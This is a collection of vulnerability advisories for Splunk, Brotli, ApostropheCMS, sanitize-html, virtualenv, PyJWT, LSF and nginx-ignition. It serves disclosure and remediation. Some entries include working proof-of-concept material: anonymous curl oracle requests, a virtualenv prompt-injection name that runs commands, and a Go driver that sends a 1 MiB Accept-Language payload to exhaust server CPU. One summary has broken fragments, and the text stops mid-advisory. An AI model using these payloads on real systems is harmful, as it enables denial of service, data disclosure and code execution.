In Splunk Enterprise versions below 10.4.4, 10.2.8, 10.0.11, and 9.4.16, a user who does not hold the "admin" or "power" Splunk roles could make the Splunk Enterprise instance unavailable to other users by sending a request to the Representational State Transfer (REST) API endpoint for lookup table files. The affected instance requires a restart to restore service.
The vulnerability is possible because the endpoint does not limit resource use when it processes response field selections.
For more information see Endpoints reference list (https://help.splunk.com/en/splunk-enterprise/rest-api-reference/10.4/introduction/endpoints-reference-list) and About configuring role-based user access (https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/manage-splunk-platform-users-and-roles/about-configuring-role-based-user-access) in the Splunk documentation.

In Splunk Enterprise versions below 10.4.4, 10.2.8, and 10.0.11, an unauthenticated user could send repeated requests to the Edge Processor package download endpoint in the Splunk Pipeline Builders app. The requests could cause the Splunk daemon to consume excessive system resources and potentially stop responding.
The vulnerability is possible because the endpoint accepts package download requests without authentication and reads and base64-encodes the complete package in memory for each request.
After upgrading, prepare all existing Edge Processor instances, turn on authentication for Edge Processor package downloads, and restart Splunk Enterprise. For more information, see Enable authentication for Edge Processor package downloads (https://help.splunk.com/en/data-management/process-data-at-the-edge/use-edge-processors-for-splunk-enterprise/10.4/administer-edge-processors/enable-authentication-for-edge-processor-package-downloads).

A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.

Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

### Summary
ApostropheCMS lets a module expose an anonymous read API by setting `publicApiProjection`, which whitelists the document fields unauthenticated callers may see. The public REST GET handler applies every launderable query builder from the query string *before* forcing that projection. Two of those builders, `search` and `sort`, operate on the underlying documents rather than the projected output, and neither is checked against the projection. An unauthenticated attacker can therefore:

- use `?search=<word>` as a **value oracle** to confirm and locate documents by the content of a field the projection was meant to hide, and
- use `?sort[hiddenField]=1` as an **ordering oracle** to rank documents by a hidden field's value.

This is the same confidentiality-bypass class already patched for the `choices`/`counts` builders (gated by `choicesFieldAllowedByProjection`). That gate was never applied to `search` or `sort`.

### Details
For an anonymous caller, `getRestQuery` (piece types: `modules/@apostrophecms/piece-type/index.js:1142`; pages: `modules/@apostrophecms/page/index.js`) does:

```js
const query = self.find(req).attachments(true);
query.applyBuildersSafely(req.query);            // (1) apply ALL launderable builders from the query string
...
query.project({ ...self.options.publicApiProjection, cacheInvalidatedAt: 1 }); // (2) force read projection
query.set('publicApiProjection', self.options.publicApiProjection);            // (3) used only by the choices/counts gate
```

`applyBuildersSafely` (`modules/@apostrophecms/doc-type/index.js:3327`) runs any builder that has a `launder` method. `search` and `sort` both have one (`doc-type/index.js:2288` and `2127`), so `?search=` and `?sort[...]=` are honored for anonymous requests.

**Search vector.** The `search` builder adds `{ $text: { $search: <user input> } }` (`doc-type/index.js:2282`). The `$text` index covers `highSearchText` / `lowSearchText` / `title` / `searchBoost` (`modules/@apostrophecms/doc/index.js:612`). `highSearchText` / `lowSearchText` are built at save time by `@apostrophecms/search:getSearchTexts` → `apos.schema.indexFields(schema, doc, texts)` (`modules/@apostrophecms/search/index.js:377`), which indexes every schema field where `searchable !== false` (the default for string/text fields). `publicApiProjection` does not imply `searchable: false`. Step (2) narrows the output but not the `$text` filter, so the response returns the projected `{title, slug, _id}` of exactly the documents whose hidden field contains the searched word.

**Sort vector.** `finalizeSort` (`doc-type/index.js:3526`) forwards raw user sort keys to MongoDB (it only rewrites fields flagged `sortify: true`). `?sort[hiddenField]=1` orders results by a projection-excluded field. Combined with `perPage`/`page`, an attacker can page through the fully ordered set.

Neither builder consults `publicApiProjection`, whereas `choices`/`counts` are gated at `doc-type/index.js:2807` via `choicesFieldAllowedByProjection`.

### PoC
**Preconditions:** the piece/page type sets `publicApiProjection`, and its schema has at least one searchable (default) or sortable field not included in the projection.

Test type: `article` exposes only `title`, `slug`, `_id`, but has hidden `secret` (integer) and `secretNote` (searchable string):

```js
export default {
  extend: '@apostrophecms/piece-type',
  options: { publicApiProjection: { title: 1, slug: 1, _id: 1 } },
  fields: { add: {
    secret:     { type: 'integer' },
    secretNote: { type: 'string' }   // searchable by default; NOT in the projection
  } }
};
```

Five articles were inserted and published via the authenticated REST API:
`A.secret=50, secretNote="zzsecretalpha"`; `B=10/zzsecretbravo`; `C=90/zzsecretcharlie`; `D=30/zzsecretdelta`; `E=70/zzsecretecho`.
The insert responses confirm the hidden `secretNote` value is written into the search index, e.g. for A: `"highSearchText": "... zzsecretalpha"`, `"lowSearchText": "... zzsecretalpha"`.

Anonymous requests (no credentials, no session):

```bash
# [1] Baseline: projection hides secret/secretNote on direct read
curl -s 'http://localhost:3000/api/v1/article?perPage=1'

# [2] Search oracle: value exists ONLY in hidden secretNote
curl -s 'http://localhost:3000/api/v1/article?search=zzsecretalpha'
curl -s 'http://localhost:3000/api/v1/article?search=zznotpresentxyz'

# [3] Sort oracle: order by hidden integer field
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=1'
curl -s 'http://localhost:3000/api/v1/article?sort%5Bsecret%5D=-1'

# Negative control: projection override is blocked
curl -s 'http://localhost:3000/api/v1/article?project%5BsecretNote%5D=1&perPage=1'
```

Results (verified on ApostropheCMS 4.32.2, MongoDB 7.0):

| Request (anonymous)       | Observed                                          | Verdict                               |
| ------------------------- | ------------------------------------------------- | ------------------------------------- |
| `GET /api/v1/article`     | `_id,title,slug,type,metaType,cacheInvalidatedAt` | projection works on direct read       |
| `?search=zzsecretalpha`   | only Article A (with textScore)                   | **leak**: locates doc by hidden field |
| `?search=zznotpresentxyz` | 0 results                                         | oracle confirmed                      |
| `?sort[secret]=1`         | B, D, A, E, C  (= 10,30,50,70,90)                 | **leak**: full hidden ordering        |
| `?sort[secret]=-1`        | C, E, A, D, B                                     | reverse confirmed                     |
| `?project[secretNote]=1`  | secretNote absent                                 | gated (projection override blocked)   |

### Impact
Unauthenticated, network-reachable partial disclosure of fields the developer explicitly restricted with `publicApiProjection`:

- **Search oracle:** confirm and locate documents by words in hidden fields (e.g. internal notes, contact emails, draft metadata, moderation/status flags), returning the `title`/`slug`/`_id` of matches.
- **Sort oracle:** full ordering of documents by a hidden field. With one known reference value or a paging binary search, exact hidden values can be recovered.

No authentication or user interaction required. Not a full field dump, but a targeted oracle over exactly the data the projection is meant to conceal. Affects sites that configure `publicApiProjection` on piece types or pages, up to and including 4.32.2 (same code path present on current `main`).

### Remediation
Gate `search`, `sort` (and `autocomplete`, which feeds `search`) on the public API path the same way `choices`/`counts` are gated. When `publicApiProjection` is in force:

- **sort:** reject or drop any sort key not permitted by the projection, reusing `choicesFieldAllowedByProjection`.
- **search:** restrict full-text search to fields the projection exposes (e.g. a projection-scoped search text), or refuse the `search` builder when the projection excludes any searchable field.

cves.summary: ### Summary The color field accepts any string that *begins* with a valid `rgb()` / `hsl()` color, because `TinyColor.isValid` does not anchor its match at the end of the string. An authenticated user with edit rights can store arbitrary HTML after a valid color prefix. When the stored value is rendered , the payload executes, resulting in stored XSS. ### Details Server-side validation of the color field relies on TinyColor: ```js const { TinyColor } = require('@ctrl/tinycolor'); if (!new TinyColor(value).isValid) throw self.apos.error('invalid'); ``` TinyColor's `rgb`/`hsl` matchers are not anchored at the end of the string, while hex matchers are. Tested with @ctrl/tinycolor | Input | `isValid` | |---|---| | `rgb(1,2,3)` | `true` | | `rgb(1,2,3)` | `true` | | `hsl(0,100%,50%);--x:1}` | `true` | | `#ff0000` | `false` | The value is saved to MongoDB unchanged (not normalized to hex8). ### Relation to GHSA-97v6-998m-fp4g GHSA-97v6 addressed CSS custom property injection escaping a ``" OR "a separate HTML sink at X is exploitable"]. Fixing the validation (requiring the full string to be a color, or storing only TinyColor's normalized output) would close both. ### Impact Any user with edit permission can plant persistent JavaScript that runs in the browser of visitors and administrators viewing the affected page, enabling session hijacking and actions as an admin. ### Suggested fix Reject values unless the entire string is a valid color, e.g. normalize on save: ```js const c = new TinyColor(value); if (!c.isValid) throw self.apos.error('invalid'); value = c.toHex8String(); // store only normalized output ```

cves.summary:
### Summary

Since 2.18.0, when an `<iframe>` is not allowed and `disallowedTagsMode` is `'discard'` (the defaults),
its raw-text content is re-sanitized by a recursive call to `sanitizeHtml(text, options)` (the change
from #5564, fixing #5550). The recursion has no bound and starts each nested call with a fresh state.
Two consequences, both absent from 2.17.7 and 2.17.4:

1. A few kilobytes of unclosed `<iframe>` tags throw `RangeError: Maximum call stack size exceeded`
   with the default options. Any application that sanitizes untrusted HTML with 2.18.0 can be made to
   throw on a small crafted input.
2. `nestingLimit` is not enforced across a discarded iframe: each nested iframe restarts the depth
   count at zero, so the output can be nested arbitrarily deep regardless of the configured limit.

### Affected versions

- 2.18.0 (the current `latest`), and the `main` branch at the time of writing (the recursive call is
  still in `packages/sanitize-html/index.js`, in the `ontext` handler, branch
  `tag === 'iframe' && !tagAllowed(tag) && options.disallowedTagsMode === 'discard'`).
- Not affected: 2.17.7 and 2.17.4 (tested with the same inputs below).

Tested with Node.js v26.7.0.

### Reproduction 1: stack overflow with the default options

```js
const sanitizeHtml = require('sanitize-html');

// with 2.18.0:
sanitizeHtml('<iframe>'.repeat(1000));  // 8,000 chars: returns ''
sanitizeHtml('<iframe>'.repeat(2000));  // 16,000 chars: throws RangeError: Maximum call stack size exceeded
sanitizeHtml('<iframe>'.repeat(20000)); // 160,000 chars: throws RangeError: Maximum call stack size exceeded
```

Results:

| input | 2.17.4 | 2.17.7 | 2.18.0 |
|---|---|---|---|
| `'<iframe>'.repeat(1000)` | ok | ok | ok |
| `'<iframe>'.repeat(2000)` | ok | ok | RangeError |
| `'<iframe>'.repeat(20000)` | ok | ok | RangeError |

The threshold depends on the remaining stack, so it is lower when `sanitizeHtml` is called from an
already deep call stack (for example inside a server-side rendering pass).

### Reproduction 2: `nestingLimit` is bypassed

```js
const sanitizeHtml = require('sanitize-html');

const input = ('<iframe>' + '<b>'.repeat(3)).repeat(50) + 'x';
const out = sanitizeHtml(input, { allowedTags: ['b'], nestingLimit: 3 });
// maximum nesting depth of <b> in `out`:
//   2.17.4: 2    2.17.7: 0 (fallback escaped as text)    2.18.0: 150
```

Without an iframe, the same options cap the output at three nested `<b>` in all three versions. With
`k` repetitions of `'<iframe>' + '<b>'.repeat(3)`, 2.18.0 returns `3 * k` nested `<b>` (measured for
k = 1, 5, 50: depth 3, 15, 150).

### Cause

In 2.18.0 the `ontext` handler does:

```js
} else if (
  tag === 'iframe' &&
  !tagAllowed(tag) &&
  options.disallowedTagsMode === 'discard'
) {
  result += sanitizeHtml(text, options);
}
```

Because htmlparser2 treats `<iframe>` as a raw-text element, the text of an unclosed iframe is the whole
remainder of the input; re-parsing it can meet another unclosed `<iframe>`, and so on, one stack frame
(and one full re-parse) per iframe. The nested call also starts with its own `depth`, so tags inside the
fallback are not counted against `nestingLimit` together with the enclosing tags.

### Possible directions

Not a patch, only what would close both effects: bound the recursion (or process the fallback without
recursing), and carry the current depth into the nested sanitization so that `nestingLimit` applies to
the whole output.

## Review scope and evidence limits

Package: @apostrophecms/import-export, version 3.7.0.

Release tag reviewed: @apostrophecms/import-export@3.7.0, commit 9500b8b0e1d630d5e07fbb5fd2c25ed0943845ce (September 30, 2026).

Current main reviewed: 5ce3732be0ebdebb4db0f8ef160c81e8671157e6.

The importer, gzip extractor, import permission gate, and core permission implementation have no differences between that release tag and the reviewed main. This follow-up is a static remediation review. We have not repeated the original end-to-end reproductions against the latest release or tested a deployed site. Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. 

## Import API bypasses publication roles for protected content

The import gate in canImportOrExport() checks the type's import configuration and view permission. The write helpers then call document-manager insert/update directly, including operations on published variants. We did not find the normal publish permission check or beforePublish transition in these helpers. Core permissions intentionally distinguish editRole and publishRole, and the ordinary publication lifecycle enforces that distinction.

The reported security boundary is a content type that an editor may edit but whose publication is reserved for a stronger role. Direct public-state changes through import must enforce the same publication authority. The original report describes unauthorized creation, replacement, or removal of published content under that configuration.

Suggested remediation: centralize authorization for import writes; require publish permission for every non-autopublished published variant, authorize each concrete target, and preflight the complete import before persistent changes. Preserve authorized draft imports and the intended behavior of autopublished types.

Source references:
- [Import write helpers](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)
- [Import permission gate](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/index.js)
- [Core role distinctions](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/permission/index.js)
- [Core insert/update/publication permission hooks](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/apostrophe/modules/%40apostrophecms/doc/index.js)

## Archive duplicate continuation permits unauthorized published-content replacement

The overrideDuplicates() continuation still accepts client-supplied replacement choices, rather than binding them to a server-maintained, user-owned duplicate analysis. The replacement and write helpers do not establish a single canonical resource identity and authorization context before the update. This leaves the reported gap between draft editing authority and the published target selected for replacement unresolved at source level.

The original report describes a contributor crossing the publication boundary through duplicate replacement on an import-enabled localized type. We have not repeated that end-to-end sequence on 3.7.0.

Suggested remediation: bind continuation state to the initiating user, archive, job, permitted source/target mapping, locale and mode; reject inconsistent identity metadata; derive permissions from the actual loaded target and require publication authority for published targets.

Source: overrideDuplicates(), replaceDocId(), and insertOrUpdateDoc() in the [importer](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js).

Current exploitability and impact therefore still require maintainer validation; the observations below establish that the reported security checks remain absent in public source. The original emailed PDF contains the original reproduction material. Please refer to that existing private attachment.

## Import archive extraction lacks resource quotas and failure cleanup

The current gzip extractor handles destination write errors and waits for write completion; those parts of the original report should no longer be treated as unchanged. The import routes also now require a logged-in user before big-upload processing, as covered by GHSA-86wm-68pq-5jwq.

However, extract() still writes expanded archive entries without per-entry, aggregate decompressed-byte, or entry-count quotas. Archive parsing still precedes document-type authorization. If extraction or parsing fails, import() notifies and rethrows before the later storage.remove() call, with no unconditional cleanup around that lifecycle. The reported residual risk is excessive storage consumption and retained extraction/staging artifacts from authenticated imports. Handling a write error and requiring login do not enforce a storage budget.

Suggested remediation: add configurable streaming quotas based on actual decompressed bytes, cap entries and allowed entry types, bound concurrent imports, and clean local and uploadfs artifacts on every failure. Retain continuation artifacts only under explicit ownership, expiry and total-storage limits.

Source references:
- [Gzip extractor](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/formats/gzip.js)
- [Import lifecycle and cleanup](https://github.com/apostrophecms/apostrophe/blob/5ce3732be0ebdebb4db0f8ef160c81e8671157e6/packages/import-export/lib/methods/import.js)

cves.summary:
### Summary

The bash `activate` script escapes the environment name for only one of the two passes bash makes over `PS1`, so a
backslash in the name undoes the escaping and a name containing `\$(...)` runs as commands in the user's shell each
time bash draws the prompt.

### Affected area

`src/virtualenv/activation/bash/activate.sh`, the block that prepends the environment name to `PS1`.

### Attacker-controlled input

The environment name: the environment directory's name, or the `--prompt` or `VIRTUALENV_PROMPT` value. An attacker
needs to influence it, for example through a CI job or wrapper tool that passes a branch, project or job name through,
or a directory in a cloned repository or unpacked archive. `--prompt .` takes the current directory's name.

### Details

bash handles `PS1` in two passes each time it draws the prompt: it first decodes backslash prompt escapes, turning `\\`
into `\` and `\$` into `$` (or `#` for root), and then runs parameter expansion, command substitution and arithmetic
expansion on the result. Since 21.13.0 the script escapes backslashes, dollar signs and backticks in the name, but only
for the second pass, so the decode pass strips the escaping that a backslash in the name precedes. Releases before
21.13.0 do not escape the name at all. A bash running as root decodes `\$` to `#`, so the payload shows the wrong text
there but runs nothing. zsh does no decode pass and is not affected.

### Proof of concept

```console
$ virtualenv --prompt 'a\$(touch PWNED)' env
$ bash --norc --noprofile -c 'source env/bin/activate; printf "%s" "${PS1@P}"'
$ ls PWNED
PWNED
```

### Impact

Arbitrary command execution in the shell of a user who sources the `activate` script of an environment whose name an
attacker influenced, with that user's privileges, once per prompt draw.

### Versions tested

21.14.6 with bash 5.2.15 on Debian bookworm, as an unprivileged user and as root.

### Known mitigation

Set `VIRTUAL_ENV_DISABLE_PROMPT=1` before you source `activate`, which leaves `PS1` alone, or run `shopt -u promptvars`
if your prompt does not need expansion. Check the name of an environment you did not create before you source its
`activate`.

### Latest release

- [x] The problem reproduces on the latest virtualenv release.

21.14.6

### Patches

Fixed in 21.14.7. Under bash, `activate` now escapes backslashes, dollar signs and backticks for both passes, so the
example above runs nothing and the prompt shows the name as given. zsh keeps the single escaping it needs.
Fix: https://github.com/pypa/virtualenv/commit/c3104e02474b652832a9bbaae79f6e1696296932

### Credits

Found while running the virtualenv test suite as root inside the Anthropic OSS Scanner build image.

### Summary

PyJWT 2.13.0 contains an incomplete defense against algorithm confusion when
an application mixes symmetric and asymmetric algorithms in one verification
path. A public RSA, EC, or OKP JWK can be accepted as an HMAC secret when it
is wrapped in a JWKS object, nested in an array, or represented in another
container form that does not expose a top-level `kty` member.

### Impact

An attacker who knows the public key material can forge HS256/HS384/HS512
tokens if the application simultaneously:

* allows both HS* and asymmetric algorithms;
* passes raw public JWK/JWKS JSON as `key=`; and
* uses that same value as the HMAC secret.

This can allow forged JWT claims in affected application configurations. The
issue does not affect applications that keep symmetric and asymmetric
verification paths separate and follow PyJWT's algorithm-selection guidance.

### Fix status

The fix is on `master` in commit `801cd12` (`fix: reject public JWK container
HMAC keys`). `HMACAlgorithm.prepare_key` now rejects public JWK members found in
objects, arrays, nested containers, BOM/UTF variants, and recursion-limit
inputs. It also recognizes escaped JSON member names without treating ordinary
string values as JWKs. Ordinary JSON secrets remain accepted byte-for-byte.

The change was tested with focused regression tests and the full local tox
matrix. Available Python 3.9, 3.12, and 3.13 crypto/no-crypto suites, mypy,
package metadata, and coverage passed; unavailable interpreters were skipped
by the project configuration. A fresh independent Astra/max security review
accepted the final diff with no blocking findings.

The affected range is `= 2.13.0`. The fix is on the unreleased development
branch; the patched version will be recorded when a released 2.x version
containing the fix is available. This advisory is being moved to draft pending
that release.

### Reporter credit

Credit: Charles Vosburgh / Trilobyte.

### Original report

The original report and reproduction package are retained in the private
advisory record.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

### Summary

PyJWT 2.13.0 `PyJWKClient` followed HTTP redirects while fetching a JWKS,
without validating the redirect destination. A configured trusted endpoint
could therefore redirect the client to a different host.

### Impact

When an application uses `PyJWKClient` with caller-supplied request headers and
an attacker can influence the configured endpoint's response, the redirected
request could expose those headers and the redirected response could be used as
authoritative key material. This could cause JWKS trust poisoning and, in
affected mixed-configuration applications, forged JWT acceptance. The issue
requires an attacker-influenced redirect from the configured JWKS endpoint; it
is not triggered by a token `kid` alone.

### Affected versions

PyJWT `<= 2.13.0`.

### Fix

The issue is fixed on `master` in commit
[`0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56`](https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56).
`PyJWKClient` now disables automatic redirects for JWKS fetches. Regression
tests verify that a redirect is rejected without contacting its destination,
while normal fetches, headers, caching, errors, timeouts, and SSL context remain
covered.

The fix is present in the unreleased development branch. The patched version
will be recorded after a released PyJWT 2.x version containing the fix is
confirmed.

### Credit

Credit: the original reporter of GHSA-9v7f-9g4p-ffgj. Additional redirect
header-leak and cache-poisoning evidence from the newer duplicate report
GHSA-43g3-98cx-x446 is preserved in the duplicate record and informed this
canonical advisory update.

## Maintainer update — 2026-09-11

Buffer overflow in eauth in Load Sharing Facility 4.x, 5.x, and 6.x allows local users or remote attackers within the LSF cluster to cause a denial of service (segmentation fault) and possibly execute arbitrary code via a long LSF_From_PC parameter.

Load Sharing Facility (LSF) 4.x, 5.x, and 6.x uses the LSF_EAUTH_UID environment variable, if it exists, instead of the real UID of the user, which could allow remote attackers within the local cluster to gain privileges.

### Summary

The gin i18n middleware in nginx-ignition's API server runs in front of every HTTP request and calls `golang.org/x/text/language.ParseAcceptLanguage` on the raw `Accept-Language` header without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of `-` characters in the input at 1000, but it does not cap `_` characters even though the parser's internal scanner aliases `_` to `-` before parsing. A single unauthenticated GET request with an `Accept-Language` header built out of `_` separators burns about 2.4 seconds of server CPU on the host running nginx-ignition; ten concurrent attackers saturate a ten-core box for the duration of the attack while consuming ~10 MiB/s of upstream bandwidth.

### Affected versions

`dillmann.com.br/nginx-ignition` v2.40.0 and (per code inspection of `main`) earlier 2.x versions whose `api/common/server/i18n.go` middleware routes the `Accept-Language` header through `language.ParseAcceptLanguage` without imposing its own size or character filter. Verified on:

- the official `dillmann/nginx-ignition:latest` Docker image at v2.40.0 (E2E below)
- `main` at commit `faef4c99442b329cfa4ee8879bdba41c22866a18` by reading `api/common/server/i18n.go` (the middleware is unchanged)

### Privilege required

Unauthenticated. The middleware is registered on the global gin router that serves both the login page and the unauthenticated `/api/health` style endpoints. Anyone who can reach the HTTP listener (port 8090 by default) is in scope.

### Vulnerable code

[`api/common/server/i18n.go`](https://github.com/lucasdillmann/nginx-ignition/blob/faef4c99442b329cfa4ee8879bdba41c22866a18/api/common/server/i18n.go) (blob SHA `faef4c99442b329cfa4ee8879bdba41c22866a18`):

```go
func i18nMiddleware(commands i18n.Commands) gin.HandlerFunc {
    return func(ginCtx *gin.Context) {
        lang := commands.DefaultLanguage()

        langHeader := ginCtx.GetHeader("Accept-Language")
        tags, _, err := language.ParseAcceptLanguage(langHeader)
        if err == nil && len(tags) > 0 {
            for _, tag := range tags {
                if commands.Supports(tag) {
                    lang = tag
                    break
                }
            }
        }

        //nolint:staticcheck
        updatedCtx := context.WithValue(ginCtx.Request.Context(), i18n.ContextKey, lang)
        ginCtx.Request = ginCtx.Request.WithContext(updatedCtx)
        ginCtx.Set(i18n.ContextKey, lang)
        ginCtx.Next()
    }
}
```

`ginCtx.GetHeader("Accept-Language")` is the unfiltered HTTP header. Go's default `net/http` `MaxHeaderBytes` is `1 << 20` = 1 MiB and nginx-ignition does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.

CVE-2022-32149 hardened `ParseAcceptLanguage` by counting `-` characters and rejecting inputs with more than 1000 of them. The guard does not count `_` characters even though the scanner converts `_` to `-` at parse time ([`golang.org/x/text/internal/language/parse.go`](https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go)). A 1 MiB header full of 9-character `_abcdefghi` tokens contains zero `-` characters, passes the guard, and then drives the scanner into the O(N²) `gobble` path.

### How `Accept-Language` reaches `ParseAcceptLanguage`

Every HTTP request that hits the nginx-ignition API server passes through `i18nMiddleware` (registered as a global gin middleware). The middleware sequence is:

1. The request enters `i18nMiddleware`.
2. `ginCtx.GetHeader("Accept-Language")` returns the full attacker-supplied header value.
3. `language.ParseAcceptLanguage(langHeader)` runs unfiltered.

No size or character-class filter is applied between (2) and (3). The middleware runs for every gin handler, including unauthenticated paths like the root URL and `/api/health` (which returns 404 but still completes the middleware chain).

### Proof of concept

Single-line bash reproducer that crafts the malicious header and times one request against a fresh `dillmann/nginx-ignition:latest` container:

```bash
docker run -d --name ngi --rm -p 18090:8090 dillmann/nginx-ignition:latest
sleep 5

PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 100000, end="")')"
echo "header size = ${#PAYLOAD} bytes"

curl -sS -o /dev/null \
  -w 'http=%{http_code} t=%{time_total}\n' \
  -H "Accept-Language: ${PAYLOAD}" \
  http://127.0.0.1:18090/api/health
```

Each 9-character `_abcdefghi` token has length 9, which fails the scanner's `len <= 8` tag-length check at `golang.org/x/text/internal/language/parse.go` and triggers a `gobble` call that `runtime.memmove`s the entire remaining buffer. With N invalid tokens the total bytes moved by `gobble` is O(N²).

### End-to-end reproduction (against `dillmann/nginx-ignition:latest` at v2.40.0)

A Go driver `poc.go` boots the container, sends a 1 MiB `Accept-Language` value once with `-` (CVE-2022-32149 guard fires) and once with `_` (guard bypassed):

```go
// poc.go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"
)

const targetURL = "http://127.0.0.1:18090/api/health"

func buildPayload(sep string, targetBytes int) string {
    const tok = "abcdefghi"
    var b strings.Builder
    b.Grow(targetBytes + 16)
    b.WriteString("en")
    for b.Len()+1+len(tok) <= targetBytes {
        b.WriteString(sep)
        b.WriteString(tok)
    }
    return b.String()
}

func send(label, header string) {
    client := &http.Client{
        Timeout: 60 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            DialContext: (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
        },
    }
    req, _ := http.NewRequest("GET", targetURL, nil)
    if header != "" {
        req.Header.Set("Accept-Language", header)
    }
    t0 := time.Now()
    resp, err := client.Do(req)
    dt := time.Since(t0)
    if err != nil {
        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
        return
    }
    _, _ = io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
        label, len(header),
        strings.Count(header, "_"), strings.Count(header, "-"),
        resp.StatusCode, dt)
}

func main() {
    send("warm-up", "")
    send("baseline (no header)", "")
    send("baseline (1 short tag)", "en-US")
    send("guard-fires ('-' x 1MiB)", buildPayload("-", 1<<20))
    send("attack ('_' x 1MiB)",     buildPayload("_", 1<<20))
    send("attack repeat 2",          buildPayload("_", 1<<20))
    send("attack repeat 3",          buildPayload("_", 1<<20))
}
```

Captured run output (Apple M1 Pro, darwin/arm64, Go 1.26.1, the official `dillmann/nginx-ignition:latest` image at v2.40.0):

```
E2E: golang/x/text ParseAcceptLanguage '_' bypass through
lucasdillmann/nginx-ignition 2.40.0 i18nMiddleware at
api/common/server/i18n.go.

Target: http://127.0.0.1:18090/api/health   payload=1048576 B

  warm-up                                      header=0 B  '_'=0  '-'=0  status=404  t=10.336041ms

measurements (single request each) ---
  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=404  t=4.211583ms
  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=404  t=3.276416ms
  guard-fires control ('-' x payload)          header=1048572 B  '_'=0  '-'=104857  status=404  t=31.683792ms
  attack ('_' x payload)                       header=1048572 B  '_'=104857  '-'=0  status=404  t=2.429408875s
  attack repeat 2                              header=1048572 B  '_'=104857  '-'=0  status=404  t=3.589948166s
  attack repeat 3                              header=1048572 B  '_'=104857  '-'=0  status=404  t=2.415860875s
```

Interpretation:

| Request                                  | Header bytes | Server time |
|------------------------------------------|--------------|-------------|
| no header / short tag                    | 0 - 5        | 3 - 11 ms   |
| 1 MiB `-` separators (CVE-2022-32149 guard fires) | 1 MiB | 32 ms       |
| 1 MiB `_` separators (guard bypassed)    | 1 MiB        | 2.4 - 3.6 s |

The `-` control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 1 MiB `-` payload returns in 32 ms because the parser short-circuits with `ErrTagListTooLarge`. The `_` attack returns 404 (the same as the baseline) from the same endpoint but consumes ~2.4-3.6 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~75-110x (32 ms guard-fires vs 2.4-3.6 s attack on the same 1 MiB header).

### Impact

- One unauthenticated client can pin one CPU core for ~2.4 seconds per 1 MiB request to any URL (the middleware runs even on 404 paths).
- Ten concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core nginx-ignition instance indefinitely.
- The 4xx/5xx status of the eventual response does not matter — the middleware runs before route resolution, so the CPU cost is paid whether the URL exists or not.
- Self-hosted nginx-ignition instances exposed to the public internet (a documented deployment pattern in the project's README) are exposed.

### Suggested fix

Apply the size / character-class filter inside the middleware before reaching `language.ParseAcceptLanguage`. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count `_` alongside `-` and short-circuit when the total exceeds a small ceiling:

```go
// api/common/server/i18n.go
const maxAcceptLanguageSeparators = 32 // real browsers send < 10

func i18nMiddleware(commands i18n.Commands) gin.HandlerFunc {
    return func(ginCtx *gin.Context) {
        lang := commands.DefaultLanguage()

        langHeader := ginCtx.GetHeader("Accept-Language")
        if strings.Count(langHeader, "-")+strings.Count(langHeader, "_") > maxAcceptLanguageSeparators {
            // Refuse to call into the BCP 47 parser with absurd input.
            langHeader = ""
        }
        tags, _, err := language.ParseAcceptLanguage(langHeader)
        if err == nil && len(tags) > 0 {
            for _, tag := range tags {
                if commands.Supports(tag) {
                    lang = tag
                    break
                }
            }
        }

        //nolint:staticcheck
        updatedCtx := context.WithValue(ginCtx.Request.Context(), i18n.ContextKey, lang)
        ginCtx.Request = ginCtx.Request.WithContext(updatedCtx)
        ginCtx.Set(i18n.ContextKey, lang)
        ginCtx.Next()
    }
}
```

A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.

The underlying issue is in `golang.org/x/text/language`. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.

### Credit

Reported by tonghuaroot.

cves.summary:
### Summary
Any user that has enabled the OTP 2FA can have their TOTP reused during the standard 30 second validity window.

### Details
